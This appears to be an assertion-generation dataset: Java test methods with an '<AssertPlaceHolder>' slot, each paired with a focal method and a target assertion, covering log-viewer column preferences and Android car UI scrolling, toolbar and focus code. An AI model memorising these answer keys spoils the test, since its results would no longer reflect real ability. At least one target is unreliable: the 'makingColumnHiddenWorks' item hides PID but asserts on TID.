setAvailableBuffers(EnumSet<Buffer> availableBuffers) { resetBuffers(); boolean anyBufferAvailable = false; for (Buffer buffer : availableBuffers) { anyBufferAvailable = true; JMenuItem item = items.get(buffer); assert item != null; item.setVisible(true); bufferFilter.setBufferEnabled(buffer, item.isSelected()); } parent.setVisible(anyBufferAvailable); }"	assertFalse(parentMenu.isVisible())
"menuIsShownIfABufferIsVisible() { parentMenu.setVisible(false);  BufferFilterMenu menu = new BufferFilterMenu(parentMenu, bufferFilter); menu.setAvailableBuffers(EnumSet.of(LogRecord.Buffer.MAIN));  ""<AssertPlaceHolder>""; }
setAvailableBuffers(EnumSet<Buffer> availableBuffers) { resetBuffers(); boolean anyBufferAvailable = false; for (Buffer buffer : availableBuffers) { anyBufferAvailable = true; JMenuItem item = items.get(buffer); assert item != null; item.setVisible(true); bufferFilter.setBufferEnabled(buffer, item.isSelected()); } parent.setVisible(anyBufferAvailable); }"	assertTrue(parentMenu.isVisible())
"Exception { ColumnPrefs prefs = factory.fromJson(gson, buildVisibilityConfig(Column.MESSAGE));  ""<AssertPlaceHolder>""; }
fromJson(Gson gson, JsonElement element) throws InvalidJsonContentException { SerializableBase data = gson.fromJson(element, SerializableBase.class); return new ColumnPrefs(storage, this, data); }"	assertThat(prefs, TogglesModelTestUtils.visibleColumns(contains(Column.MESSAGE)))
"indexColumnIsNotAvailable() { ColumnPrefs prefs = factory.getDefault();  ""<AssertPlaceHolder>""; }
isColumnAvailable(Column column) { return column != Column.INDEX; }"	"assertFalse(""Index column isn't available in MainFrame"", prefs.isColumnAvailable(Column.INDEX))"
"allButIndexColumnAreAvailable() { ColumnPrefs prefs = factory.getDefault(); Set<Column> allButIndex = getAllColumnsButIndex(); ""<AssertPlaceHolder>""; }
getDefault() { return new ColumnPrefs(storage, this); }"	assertThat(TogglesModelTestUtils.getAvailableColumns(prefs), equalTo(allButIndex))
"defaultOrderIsCanonical() { ColumnPrefs prefs = factory.getDefault();  ""<AssertPlaceHolder>""; }
getColumnOrder() { return columnOrder; }"	assertThat(prefs.getColumnOrder(), matchesOrder(ColumnOrder.canonical()))
"makingColumnVisibleWorks() { ColumnPrefs prefs = factory.getDefault(); Assume.assumeFalse(prefs.isColumnVisible(Column.TID));  prefs.setColumnVisibility(Column.TID, true);  ""<AssertPlaceHolder>""; }
isColumnVisible(Column column) { return visibleColumns.contains(column); }"	assertTrue(prefs.isColumnVisible(Column.TID))
"makingColumnHiddenWorks() { ColumnPrefs prefs = factory.getDefault(); Assume.assumeTrue(prefs.isColumnVisible(Column.PID));  prefs.setColumnVisibility(Column.PID, false);  ""<AssertPlaceHolder>""; }
isColumnVisible(Column column) { return visibleColumns.contains(column); }"	assertFalse(prefs.isColumnVisible(Column.TID))
"messageColumnIsVisibleByDefault() { ColumnPrefs prefs = factory.getDefault();  ""<AssertPlaceHolder>""; }
isColumnVisible(Column column) { return visibleColumns.contains(column); }"	assertTrue(prefs.isColumnVisible(Column.MESSAGE))
"indexColumnIsHiddenByDefault() { ColumnPrefs prefs = factory.getDefault();  ""<AssertPlaceHolder>""; }
isColumnVisible(Column column) { return visibleColumns.contains(column); }"	assertFalse(prefs.isColumnVisible(Column.INDEX))
"changedVisibilityIsPersisted() { ColumnPrefs prefs = factory.loadFromConfig(); Assume.assumeTrue(prefs.isColumnVisible(Column.APP_NAME));  prefs.setColumnVisibility(Column.APP_NAME, false);  ColumnPrefs reloadedPrefs = factory.loadFromConfig();  ""<AssertPlaceHolder>""; }
isColumnVisible(Column column) { return visibleColumns.contains(column); }"	"assertFalse( ""Expected hidden column to remain hidden after reload"", reloadedPrefs.isColumnVisible(Column.APP_NAME))"
"InvalidJsonContentException { ColumnPrefs prefs = factory.fromJson(gson, buildOrderConfig(ColumnOrder.canonical()));  ""<AssertPlaceHolder>""; }
getColumnOrder() { return columnOrder; }"	assertThat(prefs.getColumnOrder(), matchesOrder(ColumnOrder.canonical()))
"InvalidJsonContentException { ImmutableList<Column> order = ImmutableList.of(Column.APP_NAME, Column.INDEX, Column.MESSAGE, Column.PID, Column.PRIORITY, Column.TAG, Column.TID, Column.TIME); Assume.assumeThat(order, Matchers.iterableWithSize(Column.values().length));  ColumnPrefs prefs = factory.fromJson(gson, buildOrderConfig(order));  ""<AssertPlaceHolder>""; }
getColumnOrder() { return columnOrder; }"	assertThat(prefs.getColumnOrder(), matchesOrder(order))
"testGetCachedFocusArea_inTheCache() { int direction = View.FOCUS_LEFT; mRotaryCache.saveFocusArea(direction, mFocusArea, 0); FocusArea focusArea = mRotaryCache.getCachedFocusArea(direction, mValidTime); ""<AssertPlaceHolder>""; }
getCachedFocusArea(int direction, long elapsedRealtime) { return mFocusAreaCache.get(direction, elapsedRealtime); }"	assertThat(focusArea).isEqualTo(mFocusArea)
"testGetCachedFocusArea_expiredCache() { int direction = View.FOCUS_LEFT; mRotaryCache.saveFocusArea(direction, mFocusArea, 0); FocusArea focusArea = mRotaryCache.getCachedFocusArea(direction, mExpiredTime); ""<AssertPlaceHolder>""; }
getCachedFocusArea(int direction, long elapsedRealtime) { return mFocusAreaCache.get(direction, elapsedRealtime); }"	assertThat(focusArea).isNull()
"testFirstItemAtTop_onInitialLoad() { mActivity.runOnUiThread( () -> mActivity.setContentView(R.layout.car_ui_recycler_view_test_activity));  onView(withId(R.id.list)).check(matches(isDisplayed()));  CarUiRecyclerView carUiRecyclerView = mActivity.requireViewById(R.id.list); TestAdapter adapter = new TestAdapter(25); mActivity.runOnUiThread(() -> { carUiRecyclerView.setAdapter(adapter); });  onView(withText(adapter.getItemText(0))).check(matches(isDisplayed()));  LinearLayoutManager layoutManager = (LinearLayoutManager) carUiRecyclerView.getLayoutManager(); ""<AssertPlaceHolder>""; }
setAdapter(@Nullable Adapter adapter) { if (mScrollBar != null) { // Make sure this is called before super so that scrollbar can get a reference to // the adapter using RecyclerView#getAdapter() mScrollBar.adapterChanged(adapter); } super.setAdapter(adapter); }"	assertEquals(layoutManager.findFirstVisibleItemPosition(), 0)
"testContinuousScroll() { mActivity.runOnUiThread( () -> mActivity.setContentView(R.layout.car_ui_recycler_view_test_activity));  onView(withId(R.id.list)).check(matches(isDisplayed()));  CarUiRecyclerView carUiRecyclerView = mActivity.requireViewById(R.id.list); TestAdapter adapter = new TestAdapter(50); mActivity.runOnUiThread(() -> { carUiRecyclerView.setAdapter(adapter); });  IdlingRegistry.getInstance().register(new ScrollIdlingResource(carUiRecyclerView)); onView(withText(adapter.getItemText(0))).check(matches(isDisplayed()));  LinearLayoutManager layoutManager = (LinearLayoutManager) carUiRecyclerView.getLayoutManager();  // Press and hold the down button for 2 seconds to scroll the list to bottom. onView(withId(R.id.car_ui_scrollbar_page_down)).perform(pressAndHold()); onView(isRoot()).perform(waitForView(withText(""Sample item #49""), 3000)); onView(withId(R.id.car_ui_scrollbar_page_down)).perform(release());  ""<AssertPlaceHolder>""; }
setAdapter(@Nullable Adapter adapter) { if (mScrollBar != null) { // Make sure this is called before super so that scrollbar can get a reference to // the adapter using RecyclerView#getAdapter() mScrollBar.adapterChanged(adapter); } super.setAdapter(adapter); }"	assertEquals(layoutManager.findLastCompletelyVisibleItemPosition(), 49)
"testPageDownScrollsOverLongItemAtTheEnd() { mActivity.runOnUiThread( () -> mActivity.setContentView(R.layout.car_ui_recycler_view_test_activity));  onView(withId(R.id.list)).check(matches(isDisplayed()));  int itemCount = 100; // Position the long item at the end. int longItemPosition = itemCount - 1;  Map<Integer, TestAdapter.ItemHeight> heightOverrides = new HashMap<>(); heightOverrides.put(longItemPosition, TestAdapter.ItemHeight.TALL); TestAdapter adapter = new TestAdapter(itemCount, heightOverrides);  CarUiRecyclerView carUiRecyclerView = mActivity.requireViewById(R.id.list); mActivity.runOnUiThread(() -> { // Setting top padding to any number greater than 0. // Not having padding will make this test pass all the time. // Also adding bottom padding to make sure the padding // after the last content is considered in calculations. carUiRecyclerView.setPadding(0, 1, 0, 1); carUiRecyclerView.setAdapter(adapter); });  IdlingRegistry.getInstance().register(new ScrollIdlingResource(carUiRecyclerView)); onView(withText(adapter.getItemText(0))).check(matches(isDisplayed()));  OrientationHelper orientationHelper = OrientationHelper.createVerticalHelper(carUiRecyclerView.getLayoutManager());  // 20 is just an arbitrary number to make sure we reach the end of the recyclerview. for (int i = 0; i < 20; i++) { onView(withId(R.id.car_ui_scrollbar_page_down)).perform(click()); }  onView(withId(R.id.car_ui_scrollbar_page_down)).check(matches(not(isEnabled())));  View longItem = getLongItem(carUiRecyclerView); // Making sure we've reached end of the recyclerview, after // adding bottom padding ""<AssertPlaceHolder>""; }
setAdapter(@Nullable Adapter adapter) { if (mScrollBar != null) { // Make sure this is called before super so that scrollbar can get a reference to // the adapter using RecyclerView#getAdapter() mScrollBar.adapterChanged(adapter); } super.setAdapter(adapter); }"	assertThat(orientationHelper.getDecoratedEnd(longItem), is(equalTo(orientationHelper.getEndAfterPadding())))
"testPageDownScrollsOverVeryLongItemAtTheEnd() { mActivity.runOnUiThread( () -> mActivity.setContentView(R.layout.car_ui_recycler_view_test_activity));  onView(withId(R.id.list)).check(matches(isDisplayed()));  int itemCount = 100; // Position the long item at the end. int longItemPosition = itemCount - 1;  Map<Integer, TestAdapter.ItemHeight> heightOverrides = new HashMap<>(); heightOverrides.put(longItemPosition, TestAdapter.ItemHeight.EXTRA_TALL); TestAdapter adapter = new TestAdapter(itemCount, heightOverrides);  CarUiRecyclerView carUiRecyclerView = mActivity.requireViewById(R.id.list); mActivity.runOnUiThread(() -> { // Setting top padding to any number greater than 0. // Not having padding will make this test pass all the time. // Also adding bottom padding to make sure the padding // after the last content is considered in calculations. carUiRecyclerView.setPadding(0, 1, 0, 1); carUiRecyclerView.setAdapter(adapter); });  IdlingRegistry.getInstance().register(new ScrollIdlingResource(carUiRecyclerView)); onView(withText(adapter.getItemText(0))).check(matches(isDisplayed()));  OrientationHelper orientationHelper = OrientationHelper.createVerticalHelper(carUiRecyclerView.getLayoutManager());  // 20 is just an arbitrary number to make sure we reach the end of the recyclerview. for (int i = 0; i < 20; i++) { onView(withId(R.id.car_ui_scrollbar_page_down)).perform(click()); }  onView(withId(R.id.car_ui_scrollbar_page_down)).check(matches(not(isEnabled())));  View longItem = getLongItem(carUiRecyclerView); // Making sure we've reached end of the recyclerview, after // adding bottom padding ""<AssertPlaceHolder>""; }
setAdapter(@Nullable Adapter adapter) { if (mScrollBar != null) { // Make sure this is called before super so that scrollbar can get a reference to // the adapter using RecyclerView#getAdapter() mScrollBar.adapterChanged(adapter); } super.setAdapter(adapter); }"	assertThat(orientationHelper.getDecoratedEnd(longItem), is(equalTo(orientationHelper.getEndAfterPadding())))
"testPageDownMaintainsMinimumScrollThumbTrackHeight() { mActivity.runOnUiThread( () -> mActivity.setContentView(R.layout.car_ui_recycler_view_test_activity));  onView(withId(R.id.list)).check(matches(isDisplayed()));  int itemCount = 25000; TestAdapter adapter = new TestAdapter(itemCount);  CarUiRecyclerView carUiRecyclerView = mActivity.requireViewById(R.id.list); mActivity.runOnUiThread(() -> { carUiRecyclerView.setAdapter(adapter); }); IdlingRegistry.getInstance().register(new ScrollIdlingResource(carUiRecyclerView)); mActivity.runOnUiThread(() -> carUiRecyclerView.requestLayout());  onView(withId(R.id.car_ui_scrollbar_page_down)).perform(click());  // Check that thumb track maintains minimum height int minThumbViewHeight = mActivity.getResources() .getDimensionPixelOffset(R.dimen.car_ui_scrollbar_min_thumb_height); View thumbView = mActivity.requireViewById(R.id.car_ui_scrollbar_thumb); ""<AssertPlaceHolder>""; }
requestLayout() { super.requestLayout(); if (mScrollBar != null) { mScrollBar.requestLayout(); } }"	assertThat(thumbView.getHeight(), is(equalTo(minThumbViewHeight)))
"testCallAnimateOnRecyclerViewWithScrollbar() { doReturn(true).when(mTestableResources).getBoolean(R.bool.car_ui_scrollbar_enable); CarUiRecyclerView carUiRecyclerView = new CarUiRecyclerView(mTestableContext);  ViewGroup container = mActivity.findViewById(R.id.test_container); container.post(() -> { container.addView(carUiRecyclerView); carUiRecyclerView.setAdapter(new TestAdapter(100)); });  onView(withId(R.id.car_ui_scroll_bar)).check(matches(isDisplayed()));  ViewGroup recyclerViewContainer = (ViewGroup) carUiRecyclerView.getParent().getParent();  ""<AssertPlaceHolder>""; }
animate() { return mScrollBarEnabled ? mContainer.animate() : super.animate(); }"	assertThat(carUiRecyclerView.animate(), is(equalTo(recyclerViewContainer.animate())))
"Throwable { runWithToolbar((toolbar) -> toolbar.setState(Toolbar.State.SUBPAGE));  onView(withId(R.id.car_ui_toolbar_nav_icon_container)).perform(click());  ""<AssertPlaceHolder>""; }
setState(State state) { mController.setState(state); }"	assertEquals(1, mActivityRule.getActivity().getTimesOnBackPressed())
"Throwable { runWithToolbar((toolbar) -> { toolbar.setState(Toolbar.State.SUBPAGE); toolbar.registerOnBackListener(() -> false); });  onView(withId(R.id.car_ui_toolbar_nav_icon_container)).perform(click());  ""<AssertPlaceHolder>""; }
registerOnBackListener(OnBackListener listener) { mController.registerOnBackListener(listener); }"	assertEquals(1, mActivityRule.getActivity().getTimesOnBackPressed())
"Throwable { runWithToolbar((toolbar) -> { toolbar.setState(Toolbar.State.SUBPAGE); toolbar.registerOnBackListener(() -> true); });  onView(withId(R.id.car_ui_toolbar_nav_icon_container)).perform(click());  ""<AssertPlaceHolder>""; }
registerOnBackListener(OnBackListener listener) { mController.registerOnBackListener(listener); }"	assertEquals(0, mActivityRule.getActivity().getTimesOnBackPressed())
"Throwable { runWithToolbar((toolbar) -> { toolbar.setState(Toolbar.State.SUBPAGE); Toolbar.OnBackListener listener = () -> true; toolbar.registerOnBackListener(listener); toolbar.registerOnBackListener(listener); toolbar.unregisterOnBackListener(listener); });  onView(withId(R.id.car_ui_toolbar_nav_icon_container)).perform(click());  ""<AssertPlaceHolder>""; }
unregisterOnBackListener(OnBackListener listener) { return mController.unregisterOnBackListener(listener); }"	assertEquals(1, mActivityRule.getActivity().getTimesOnBackPressed())
"testGetAncestorFocusArea() { mRoot.post(() -> ""<AssertPlaceHolder>""; }
getAncestorFocusArea(@NonNull View view) { ViewParent parent = view.getParent(); while (parent != null) { if (parent instanceof FocusArea) { return (FocusArea) parent; } parent = parent.getParent(); } return null; }"	assertThat(ViewUtils.getAncestorFocusArea(mView2)).isEqualTo(mFocusArea2))
"testGetAncestorFocusArea_doesNotReturnItself() { mRoot.post(() -> ""<AssertPlaceHolder>""; }
getAncestorFocusArea(@NonNull View view) { ViewParent parent = view.getParent(); while (parent != null) { if (parent instanceof FocusArea) { return (FocusArea) parent; } parent = parent.getParent(); } return null; }"	assertThat(ViewUtils.getAncestorFocusArea(mFocusArea2)).isNull())
"testGetAncestorFocusArea_outsideFocusArea() { mRoot.post(() -> ""<AssertPlaceHolder>""; }
getAncestorFocusArea(@NonNull View view) { ViewParent parent = view.getParent(); while (parent != null) { if (parent instanceof FocusArea) { return (FocusArea) parent; } parent = parent.getParent(); } return null; }"	assertThat(ViewUtils.getAncestorFocusArea(mFpv)).isNull())
"testGetAncestorScrollableContainer() { mRoot.post(() -> mList5.getViewTreeObserver().addOnGlobalLayoutListener( new ViewTreeObserver.OnGlobalLayoutListener() { @Override public void onGlobalLayout() { mList5.getViewTreeObserver().removeOnGlobalLayoutListener(this); View firstItem = mList5.getLayoutManager().findViewByPosition(0); ""<AssertPlaceHolder>""; } })); }
getAncestorScrollableContainer(@Nullable View view) { if (view == null) { return null; } ViewParent parent = view.getParent(); // A scrollable container can't contain a FocusArea, so let's return earlier if we found // a FocusArea. while (parent != null && parent instanceof ViewGroup && !(parent instanceof FocusArea)) { ViewGroup viewGroup = (ViewGroup) parent; if (isScrollableContainer(viewGroup)) { return viewGroup; } parent = parent.getParent(); } return null; }"	assertThat(ViewUtils.getAncestorScrollableContainer(firstItem)) .isEqualTo(mList5)
"testGetAncestorScrollableContainer_returnNull() { mRoot.post(() -> ""<AssertPlaceHolder>""; }
getAncestorScrollableContainer(@Nullable View view) { if (view == null) { return null; } ViewParent parent = view.getParent(); // A scrollable container can't contain a FocusArea, so let's return earlier if we found // a FocusArea. while (parent != null && parent instanceof ViewGroup && !(parent instanceof FocusArea)) { ViewGroup viewGroup = (ViewGroup) parent; if (isScrollableContainer(viewGroup)) { return viewGroup; } parent = parent.getParent(); } return null; }"	assertThat(ViewUtils.getAncestorScrollableContainer(mView2)).isNull())
"testFindFocusedByDefaultView() { mRoot.post(() -> { View focusedByDefault = ViewUtils.findFocusedByDefaultView(mRoot); ""<AssertPlaceHolder>""; }); }
findFocusedByDefaultView(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v.isFocusedByDefault() && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(focusedByDefault).isEqualTo(mFocusedByDefault3)
"testFindFocusedByDefaultView_skipNotFocusable() { mRoot.post(() -> { mFocusedByDefault3.setFocusable(false); View focusedByDefault = ViewUtils.findFocusedByDefaultView(mRoot); ""<AssertPlaceHolder>""; }); }
findFocusedByDefaultView(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v.isFocusedByDefault() && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(focusedByDefault).isNull()
"testFindFocusedByDefaultView_skipInvisibleAncestor() { mRoot.post(() -> { mRoot.setVisibility(INVISIBLE); View focusedByDefault = ViewUtils.findFocusedByDefaultView(mFocusArea3); ""<AssertPlaceHolder>""; }); }
findFocusedByDefaultView(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v.isFocusedByDefault() && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(focusedByDefault).isNull()
"testFindImplicitDefaultFocusView_inRoot() { mRoot.post(() -> mList5.getViewTreeObserver().addOnGlobalLayoutListener( new ViewTreeObserver.OnGlobalLayoutListener() { @Override public void onGlobalLayout() { mList5.getViewTreeObserver().removeOnGlobalLayoutListener(this); View firstItem = mList5.getLayoutManager().findViewByPosition(0); View implicitDefaultFocus = ViewUtils.findImplicitDefaultFocusView(mRoot); ""<AssertPlaceHolder>""; } })); }
findImplicitDefaultFocusView(@NonNull View view) { View rotaryContainer = findRotaryContainer(view); return rotaryContainer == null ? null : findFirstFocusableDescendant(rotaryContainer); }"	assertThat(implicitDefaultFocus).isEqualTo(firstItem)
"testFindImplicitDefaultFocusView_inFocusArea() { mRoot.post(() -> mList5.getViewTreeObserver().addOnGlobalLayoutListener( new ViewTreeObserver.OnGlobalLayoutListener() { @Override public void onGlobalLayout() { mList5.getViewTreeObserver().removeOnGlobalLayoutListener(this); View firstItem = mList5.getLayoutManager().findViewByPosition(0); View implicitDefaultFocus = ViewUtils.findImplicitDefaultFocusView(mFocusArea5); ""<AssertPlaceHolder>""; } })); }
findImplicitDefaultFocusView(@NonNull View view) { View rotaryContainer = findRotaryContainer(view); return rotaryContainer == null ? null : findFirstFocusableDescendant(rotaryContainer); }"	assertThat(implicitDefaultFocus).isEqualTo(firstItem)
"testFindImplicitDefaultFocusView_skipInvisibleAncestor() { mRoot.post(() -> { mRoot.setVisibility(INVISIBLE); View implicitDefaultFocus = ViewUtils.findImplicitDefaultFocusView(mFocusArea5); ""<AssertPlaceHolder>""; }); }
findImplicitDefaultFocusView(@NonNull View view) { View rotaryContainer = findRotaryContainer(view); return rotaryContainer == null ? null : findFirstFocusableDescendant(rotaryContainer); }"	assertThat(implicitDefaultFocus).isNull()
"testFindFirstFocusableDescendant() { mRoot.post(() -> { mFocusArea2.setFocusable(true); View firstFocusable = ViewUtils.findFirstFocusableDescendant(mRoot); ""<AssertPlaceHolder>""; }); }
findFirstFocusableDescendant(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v != view && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(firstFocusable).isEqualTo(mFocusArea2)
"testFindFirstFocusableDescendant_skipItself() { mRoot.post(() -> { mFocusArea2.setFocusable(true); View firstFocusable = ViewUtils.findFirstFocusableDescendant(mFocusArea2); ""<AssertPlaceHolder>""; }); }
findFirstFocusableDescendant(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v != view && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(firstFocusable).isEqualTo(mView2)
"testFindFirstFocusableDescendant_skipInvisibleAndGoneView() { mRoot.post(() -> { mFocusArea2.setVisibility(INVISIBLE); mFocusArea3.setVisibility(GONE); View firstFocusable = ViewUtils.findFirstFocusableDescendant(mRoot); ""<AssertPlaceHolder>""; }); }
findFirstFocusableDescendant(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v != view && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(firstFocusable).isEqualTo(mView4)
"testFindFirstFocusableDescendant_skipInvisibleAncestor() { mRoot.post(() -> { mRoot.setVisibility(INVISIBLE); View firstFocusable = ViewUtils.findFirstFocusableDescendant(mFocusArea2); ""<AssertPlaceHolder>""; }); }
findFirstFocusableDescendant(@NonNull View view) { return depthFirstSearch(view, /* targetPredicate= */ v -> v != view && canTakeFocus(v), /* skipPredicate= */ v -> !v.isShown()); }"	assertThat(firstFocusable).isNull()
"testIsImplicitDefaultFocusView_firstItem() { mRoot.post(() -> mList5.getViewTreeObserver().addOnGlobalLayoutListener( new ViewTreeObserver.OnGlobalLayoutListener() { @Override public void onGlobalLayout() { mList5.getViewTreeObserver().removeOnGlobalLayoutListener(this); View firstItem = mList5.getLayoutManager().findViewByPosition(0); ""<AssertPlaceHolder>""; } })); }
isImplicitDefaultFocusView(@NonNull View view) { ViewGroup rotaryContainer = null; ViewParent parent = view.getParent(); while (parent != null && parent instanceof ViewGroup) { ViewGroup viewGroup = (ViewGroup) parent; if (isRotaryContainer(viewGroup)) { rotaryContainer = viewGroup; break; } parent = parent.getParent(); } if (rotaryContainer == null) { return false; } return findFirstFocusableDescendant(rotaryContainer) == view; }"	assertThat(ViewUtils.isImplicitDefaultFocusView(firstItem)).isTrue()
"testIsImplicitDefaultFocusView_secondItem() { mRoot.post(() -> mList5.getViewTreeObserver().addOnGlobalLayoutListener( new ViewTreeObserver.OnGlobalLayoutListener() { @Override public void onGlobalLayout() { mList5.getViewTreeObserver().removeOnGlobalLayoutListener(this); View secondItem = mList5.getLayoutManager().findViewByPosition(1); ""<AssertPlaceHolder>""; } })); }
isImplicitDefaultFocusView(@NonNull View view) { ViewGroup rotaryContainer = null; ViewParent parent = view.getParent(); while (parent != null && parent instanceof ViewGroup) { ViewGroup viewGroup = (ViewGroup) parent; if (isRotaryContainer(viewGroup)) { rotaryContainer = viewGroup; break; } parent = parent.getParent(); } if (rotaryContainer == null) { return false; } return findFirstFocusableDescendant(rotaryContainer) == view; }"	assertThat(ViewUtils.isImplicitDefaultFocusView(secondItem)).isFalse()
"testIsImplicitDefaultFocusView_normalView() { mRoot.post(() -> ""<AssertPlaceHolder>""; }
isImplicitDefaultFocusView(@NonNull View view) { ViewGroup rotaryContainer = null; ViewParent parent = view.getParent(); while (parent != null && parent instanceof ViewGroup) { ViewGroup viewGroup = (ViewGroup) parent; if (isRotaryContainer(viewGroup)) { rotaryContainer = viewGroup; break; } parent = parent.getParent(); } if (rotaryContainer == null) { return false; } return findFirstFocusableDescendant(rotaryContainer) == view; }"	assertThat(ViewUtils.isImplicitDefaultFocusView(mView2)).isFalse())
"testIsImplicitDefaultFocusView_skipInvisibleAncestor() { mRoot.post(() -> mList5.getViewTreeObserver().addOnGlobalLayoutListener( new ViewTreeObserver.OnGlobalLayoutListener() { @Override public void onGlobalLayout() { mList5.getViewTreeObserver().removeOnGlobalLayoutListener(this); mFocusArea5.setVisibility(INVISIBLE); View firstItem = mList5.getLayoutManager().findViewByPosition(0); ""<AssertPlaceHolder>""; } })); }
isImplicitDefaultFocusView(@NonNull View view) { ViewGroup rotaryContainer = null; ViewParent parent = view.getParent(); while (parent != null && parent instanceof ViewGroup) { ViewGroup viewGroup = (ViewGroup) parent; if (isRotaryContainer(viewGroup)) { rotaryContainer = viewGroup; break; } parent = parent.getParent(); } if (rotaryContainer == null) { return false; } return findFirstFocusableDescendant(rotaryContainer) == view; }"	assertThat(ViewUtils.isImplicitDefaultFocusView(firstItem)).isFalse()
"getItemCount_shouldAlwaysBeOne() { ""<AssertPlaceHolder>""; }
getItemCount() { return 1; }"	assertThat(mCarUiRecyclerViewAdapter.getItemCount()).isEqualTo(1)
"onCreateViewHolder_frameLayoutNotNull() {  when(mParent.getContext()).thenReturn(mContext); when(mParent.generateLayoutParams(any())).thenReturn(mLayoutParams);  CarUiRecyclerViewAdapter.NestedRowViewHolder nestedRowViewHolder = mCarUiRecyclerViewAdapter.onCreateViewHolder(mParent, 0);  ""<AssertPlaceHolder>""; }
onCreateViewHolder( ViewGroup parent, int viewType) { View v = LayoutInflater.from(parent.getContext()) .inflate(R.layout.car_ui_recycler_view_item, parent, false); return new NestedRowViewHolder(v); }"	assertThat(nestedRowViewHolder.frameLayout).isNotNull()
"getVerticalSnapPreference_shouldReturnSnapToStart() { ""<AssertPlaceHolder>""; }
getVerticalSnapPreference() { // Returning SNAP_TO_START will ensure that if the top (start) row is partially visible it // will be scrolled downward (END) to make the row fully visible. return SNAP_TO_START; }"	assertThat(mCarUiSmoothScroller.getVerticalSnapPreference()).isEqualTo(SNAP_TO_START)
"calculateDistanceToFinalSnap_shouldReturnTopMarginDifference() { when(mRecyclerView.getLayoutManager()).thenReturn(mLayoutManager); when(mRecyclerView.isInTouchMode()).thenReturn(true); when(mLayoutManager.getItemCount()).thenReturn(1); when(mLayoutManager.canScrollVertically()).thenReturn(true); when(mLayoutManager.getChildCount()).thenReturn(1); // some delta when(mLayoutManager.getDecoratedTop(any())).thenReturn(10); when(mChild.getLayoutParams()).thenReturn(mLayoutParams);  int[] distance = mCarUiSnapHelper.calculateDistanceToFinalSnap(mLayoutManager, mChild);  ""<AssertPlaceHolder>""; }
calculateDistanceToFinalSnap( @NonNull LayoutManager layoutManager, @NonNull View targetView) { int[] out = new int[2];  // Don't snap when not in touch mode, i.e. when using rotary. if (!mRecyclerView.isInTouchMode()) { return out; }  if (layoutManager.canScrollHorizontally()) { out[0] = distanceToTopMargin(targetView, getHorizontalHelper(layoutManager)); }  if (layoutManager.canScrollVertically()) { out[1] = distanceToTopMargin(targetView, getVerticalHelper(layoutManager)); }  return out; }"	assertThat(distance[1]).isEqualTo(10)
"calculateScrollDistance_shouldScrollHeightOfView() { when(mRecyclerView.getLayoutManager()).thenReturn(mLayoutManager); when(mLayoutManager.getItemCount()).thenReturn(1); when(mLayoutManager.canScrollVertically()).thenReturn(true); when(mLayoutManager.getChildCount()).thenReturn(1); // some delta when(mLayoutManager.getDecoratedTop(any())).thenReturn(10); when(mChild.getLayoutParams()).thenReturn(mLayoutParams); when(mLayoutManager.getChildAt(0)).thenReturn(mChild); when(mLayoutManager.getHeight()).thenReturn(-50);  int[] distance = mCarUiSnapHelper.calculateScrollDistance(0, 10);  ""<AssertPlaceHolder>""; }
calculateScrollDistance(int velocityX, int velocityY) { int[] outDist = super.calculateScrollDistance(velocityX, velocityY);  if (mRecyclerView == null) { return outDist; }  LayoutManager layoutManager = mRecyclerView.getLayoutManager(); if (layoutManager == null || layoutManager.getChildCount() == 0) { return outDist; }  int lastChildPosition = isAtEnd(layoutManager) ? 0 : layoutManager.getChildCount() - 1;  OrientationHelper orientationHelper = getOrientationHelper(layoutManager); @NonNull View lastChild = Objects.requireNonNull( layoutManager.getChildAt(lastChildPosition)); float percentageVisible = getPercentageVisible(lastChild, orientationHelper);  int maxDistance = layoutManager.getHeight(); if (percentageVisible > 0.f) { // The max and min distance is the total height of the RecyclerView minus the height of // the last child. This ensures that each scroll will never scroll more than a single // page on the RecyclerView. That is, the max scroll will make the last child the // first child and vice versa when scrolling the opposite way. maxDistance -= layoutManager.getDecoratedMeasuredHeight(lastChild); }  int minDistance = -maxDistance;  outDist[0] = clamp(outDist[0], minDistance, maxDistance); outDist[1] = clamp(outDist[1], minDistance, maxDistance);  return outDist; }"	assertThat(distance[1]).isEqualTo(50)
"setState_subpage_shouldCauseGetStateToReturnSubpage() { mToolbar.setState(Toolbar.State.SUBPAGE);  ""<AssertPlaceHolder>""; }
getState() { return mController.getState(); }"	assertThat(mToolbar.getState()).isEquivalentAccordingToCompareTo(Toolbar.State.SUBPAGE)
"registerOnBackListener_whenAListenerReturnsTrue_shouldSuppressBack() { mToolbar.setState(Toolbar.State.SUBPAGE);  mToolbar.registerOnBackListener(() -> true); pressBack(); mToolbar.registerOnBackListener(() -> false); pressBack();  ""<AssertPlaceHolder>""; }
registerOnBackListener(OnBackListener listener) { mController.registerOnBackListener(listener); }"	assertThat(mActivity.getTimesBackPressed()).isEqualTo(0)
"registerOnBackListener_whenListenerRegisteredTwice_shouldntCallListenerTwice() { mToolbar.setState(Toolbar.State.SUBPAGE); Mutable<Integer> timesBackPressed = new Mutable<>(0); Toolbar.OnBackListener listener = () -> { timesBackPressed.value++; return false; };  // Registering a second time shouldn't do anything mToolbar.registerOnBackListener(listener); mToolbar.registerOnBackListener(listener); pressBack();  ""<AssertPlaceHolder>""; }
registerOnBackListener(OnBackListener listener) { mController.registerOnBackListener(listener); }"	assertThat(timesBackPressed.value).isEqualTo(1)
"unregisterOnBackListener_previouslyRegisteredListener_shouldUnregister() { mToolbar.setState(Toolbar.State.SUBPAGE); Mutable<Integer> timesBackPressed = new Mutable<>(0); Toolbar.OnBackListener listener = () -> { timesBackPressed.value++; return false; };  mToolbar.registerOnBackListener(listener); mToolbar.unregisterOnBackListener(listener); pressBack();  ""<AssertPlaceHolder>""; }
unregisterOnBackListener(OnBackListener listener) { return mController.unregisterOnBackListener(listener); }"	assertThat(timesBackPressed.value).isEqualTo(0)
